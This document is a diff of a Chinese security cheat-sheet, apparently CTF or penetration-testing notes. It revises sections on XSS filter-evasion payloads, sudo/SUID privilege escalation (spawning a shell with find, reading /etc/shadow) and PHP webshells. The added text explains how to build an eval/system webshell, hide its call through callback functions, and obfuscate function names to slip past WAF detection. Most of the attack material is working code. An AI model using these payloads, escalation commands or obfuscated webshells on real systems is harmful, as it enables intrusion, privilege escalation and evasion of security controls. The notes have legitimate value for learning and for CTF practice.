@@ -592,7 +592,7 @@ https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.ht
 <img src=# onerror=al&#x65;rt(1);></img>
 ```
 
-**空白符**：浏览器解析Javascript时无视空白符，因此可以用空格、换行（`%0A, &#x0A;`）、回车（`%0D`）、tab（`%09`）、注释、括号等符号隔开`
+**空白符**：浏览器解析Javascript时无视空白符（注意，不能把一个关键词分成两段），因此可以用空格、换行（`%0A, &#x0A;`）、回车（`%0D`）、tab（`%09`）、注释、括号等符号隔开
 
 ```html
 <img src=# onmouseover=javascript:alert/**/(1)>
@@ -605,8 +605,6 @@ https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.ht
 String.fromCharCode(88,83,83)
 f = 8680439..toString(30);  // f = 'alert'（30进制字符串）
 ```
-
-
 
 ### 函数
 
@@ -700,7 +698,7 @@ sudo、SUID提权有几类方法：
 
 - 执行任意命令获取Shell。如：`find`，`vim`
 - 覆盖文件
-- 读取`/etc/shadow`并爆破密码。前者例子有`find`、`vim`等；后者有`cp`、`wget`等
+- 读取`/etc/shadow`并爆破密码，如`cp`，`wget`
 
 ```bash
 find /etc/passwd -exec whoami \;  # 每找到一个结果，就会执行一次-exec参数指定的命令
@@ -711,21 +709,37 @@ find /etc/passwd -exec /bin/sh \;
 
 ### php
 
+最基础的webshell：`eval($_POST['cmd']);`。混淆时要隐藏危险关键字（如`eval`），还要隐藏调用关系。前者可以用各种字符串魔术
+
+混淆时，首先要隐藏调用关系——调用的不是`eval`等危险函数，而是一个看似无害的`callable`对象。以下方法都可以用字符串调用函数（注意，`eval`是语言结构而非函数，不能作为函数调用）
+
 ```php
-# 基础webshell
-eval($_POST['cmd']);
+'system'('cat /flag');  # 可变函数
+call_user_func('system', 'ls');
+array_map('system', ['ls']);
+preg_replace('/.*/e', 'system', 'ls');           # PHP 8要用preg_replace_callback
+$f = create_function('$a', 'return eval($a);');  # PHP 8以下
 
-# 字符串魔术
-echo 'creat' . 'e_fu' . 'nction';  # 字符串拼接
-echo str_replace("z", "", "bazsze64_zdeczode"); # 替换。类似还有preg_replace
+# 类似效果的函数：
+# ob_start, unserialize, usort, uasort, uksort
+# array_filter, array_reduce, array_diff_uassoc, array_diff_ukey, array_udiff, array_uintersect
+```
+
+然后还要做字符串混淆——避免WAF检测到危险函数名、危险代码
+
+```php
+echo 'creat' . 'e_fu' . 'nction';     # 拼接
+echo str_replace("z", "", "sysztem"); # 替换
 echo base64_decode("W10=");  # 编码、加密解密。类似有str_rot13
-echo ~('和'[2]);     # 字节运算
-$x = 'a'; echo ++$x; # 另一种字节运算
-
-# 奇怪来源的字符串
+echo ~('和'[2]);      # 字节运算
+$x = 'a'; $x++;       # 另一种字节运算
 $g = $_GET['xymhwv']; # 动态传入参数
 $a = gettype([])[0];  # gettype([]) = 'array'，因此给$x赋值为'a'
+
+parse_str('a=1');     # 作为URL参数解析。PHP 8以前会直接赋值
 ```
+
+
 
 # 其他
 
